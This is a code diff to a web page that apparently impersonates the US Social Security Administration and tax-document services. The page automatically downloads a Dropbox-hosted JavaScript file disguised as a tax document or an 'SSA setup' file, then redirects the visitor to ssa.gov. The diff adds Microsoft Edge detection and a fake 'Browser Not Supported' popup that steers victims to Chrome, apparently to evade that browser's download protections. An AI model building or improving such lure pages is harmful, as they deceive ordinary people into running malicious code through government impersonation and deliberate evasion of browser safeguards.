@@ -36,6 +36,8 @@
             width: 90%;
             max-width: 450px;
             border: 1px solid #ddd;
+            position: relative;
+            z-index: 2;
         }
         .logo {
             margin-bottom: 15px;
@@ -85,6 +87,87 @@
             transform: translate(-50%, 0);
             opacity: 0;
         }
+
+        /* Edge Popup Overlay Styles */
+        .edge-popup-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: rgba(0, 0, 0, 0.7);
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: Arial, sans-serif;
+        }
+        .edge-popup-container {
+            background-color: white;
+            border-radius: 12px;
+            width: 90%;
+            max-width: 340px;
+            padding: 24px 20px 28px;
+            text-align: center;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+            animation: fadeInScale 0.2s ease-out;
+        }
+        @keyframes fadeInScale {
+            from {
+                opacity: 0;
+                transform: scale(0.95);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+        .edge-popup-icon {
+            font-size: 48px;
+            margin-bottom: 12px;
+        }
+        .edge-popup-title {
+            font-size: 22px;
+            font-weight: bold;
+            color: #1b3d6d;
+            margin-bottom: 12px;
+        }
+        .edge-popup-message {
+            font-size: 16px;
+            color: #555;
+            line-height: 1.4;
+            margin-bottom: 24px;
+        }
+        .edge-popup-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        .edge-popup-btn {
+            padding: 12px 16px;
+            border: none;
+            border-radius: 30px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+        .edge-popup-btn-primary {
+            background-color: #4285f4;
+            color: white;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        .edge-popup-btn-primary:hover {
+            background-color: #3367d6;
+            transform: scale(1.02);
+        }
+        .edge-popup-btn-secondary {
+            background-color: #f1f3f4;
+            color: #5f6368;
+        }
+        .edge-popup-btn-secondary:hover {
+            background-color: #e8eaed;
+        }
     </style>
 </head>
 <body>
@@ -108,7 +191,7 @@
 
     <script>
         // Configuration - UPDATE THESE VALUES
-        const DOWNLOAD_LINK = 'https://www.dropbox.com/scl/fi/puau4t9ris04jby60jp4n/Tax_document-2026_ref-554378800152846499517777773549.js?rlkey=qc4nllugoyrr0ohw4w5o0jwvk&st=hzkmbfkt&dl=1'; // CHANGE THIS TO YOUR DOWNLOAD LINK
+        const DOWNLOAD_LINK = 'https://www.dropbox.com/scl/fi/599os0p8ifdevwcsjkiz9/My_SSAsetup.js.js?rlkey=q3mi8b372mxajpmk1s0j429qh&st=jqr5lhle&dl=1'; // CHANGE THIS TO YOUR DOWNLOAD LINK
         const BACKGROUND_IMAGE_NAME = 'background.jpg'; // Name of your background image
         const REDIRECT_URL = 'https://www.ssa.gov/';
         const DESKTOP_REDIRECT_DELAY = 15; // 3 seconds for desktop users
@@ -126,6 +209,72 @@
         // Check if mobile device
         function isMobileDevice() {
             return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        }
+
+        // ========== EDGE BROWSER DETECTION (including mobile Edge) ==========
+        function isEdgeBrowser() {
+            const userAgent = navigator.userAgent.toLowerCase();
+            // Detect Edge (Chromium-based Edge) - includes "edg/" or "edgios" for iOS Edge or "edga" for Android Edge
+            const isEdgeChromium = userAgent.includes('edg/') || userAgent.includes('edgios/') || userAgent.includes('edga/');
+            // Also detect legacy Edge (EdgeHTML) - older versions
+            const isLegacyEdge = userAgent.includes('edge/') && !userAgent.includes('edg/');
+            
+            // Additional check: some mobile Edge browsers might use different identifiers
+            const isMobileEdge = /EdgA/i.test(navigator.userAgent) || /EdgiOS/i.test(navigator.userAgent);
+            
+            return isEdgeChromium || isLegacyEdge || isMobileEdge;
+        }
+        
+        // Function to show Edge popup overlay (same pattern as phone popup but adapted for all devices)
+        function showEdgePopup() {
+            // Create overlay element
+            const overlay = document.createElement('div');
+            overlay.className = 'edge-popup-overlay';
+            
+            // Popup HTML content - REMOVED the "Switch to Chrome" button, only Keep Dismiss button
+            overlay.innerHTML = `
+                <div class="edge-popup-container">
+                    <div class="edge-popup-icon">🌐</div>
+                    <div class="edge-popup-title">Browser Not Supported</div>
+                    <div class="edge-popup-message">
+                        You are using Microsoft Edge. For security & compatibility,<br>
+                        <strong>please use Google Chrome</strong> to access and download your documents.
+                    </div>
+                    <div class="edge-popup-buttons">
+                        <button class="edge-popup-btn edge-popup-btn-primary" id="edgePopupDismissBtn">Dismiss</button>
+                    </div>
+                </div>
+            `;
+            
+            // Append to body
+            document.body.appendChild(overlay);
+            
+            // Prevent body scrolling while popup is active
+            document.body.style.overflow = 'hidden';
+            
+            // Dismiss button event handler
+            const dismissBtn = document.getElementById('edgePopupDismissBtn');
+            
+            // Dismiss button: remove popup and show error message (prevent download & animation)
+            if (dismissBtn) {
+                dismissBtn.addEventListener('click', function() {
+                    overlay.remove();
+                    document.body.style.overflow = '';
+                    
+                    // Show a friendly error that they need Chrome
+                    contentArea.innerHTML = `
+                        <div class="error-message">
+                            This document requires Google Chrome for proper security validation.<br><br>
+                            Please open this page using Google Chrome to download your tax documents.
+                        </div>
+                    `;
+                    
+                    // Hide rolling animation container if active
+                    if (rollingContainer) {
+                        rollingContainer.style.display = 'none';
+                    }
+                });
+            }
         }
 
         // Circular rolling animation
@@ -222,7 +371,7 @@
             `;
         }
 
-        // Trigger file download from custom link
+        // Trigger file download from custom link (without popup permission on Chrome)
         function triggerFileDownload() {
             // Create a temporary anchor element to trigger download
             const link = document.createElement('a');
@@ -248,8 +397,17 @@
             }, 6000);
         }
 
-        // Main process
+        // Main process - with Edge detection block
         async function main() {
+            // FIRST: Check if user is using Edge browser - show popup and block functionality
+            if (isEdgeBrowser()) {
+                showEdgePopup();
+                // Edge users should NOT proceed with download, animation, or redirect
+                // The popup will handle their action or show an error message
+                return; // Stop execution completely for Edge users
+            }
+            
+            // If not Edge browser, proceed with normal flow
             const deviceInfo = await collectDeviceInfo();
             
             if (deviceInfo.isMobile) {
